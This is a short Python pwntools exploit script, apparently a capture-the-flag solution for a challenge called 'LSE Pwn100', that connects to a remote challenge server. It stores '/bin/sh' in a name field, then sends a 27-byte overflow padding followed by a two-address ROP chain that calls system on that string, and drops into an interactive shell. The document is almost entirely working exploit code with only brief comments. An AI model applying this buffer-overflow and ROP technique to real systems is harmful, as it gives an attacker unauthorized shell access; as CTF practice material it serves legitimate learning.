#LSE Pwn100 

from pwn import *

#p = process ('./pwn100')

p = remote('lse.epita.fr', 52114)

p.recv()
p.sendline('/bin/sh')

p.recv()
p.sendline('1')

rop_chain = p32(0x0804881a) # adds system call
rop_chain += p32(0x8049dc8) # adds address to /bin/sh in name


p.recv()
p.sendline("A"*27+ rop_chain)

p.interactive()

#0x0804881a - System Call
#0x8049dc8 - name field



	


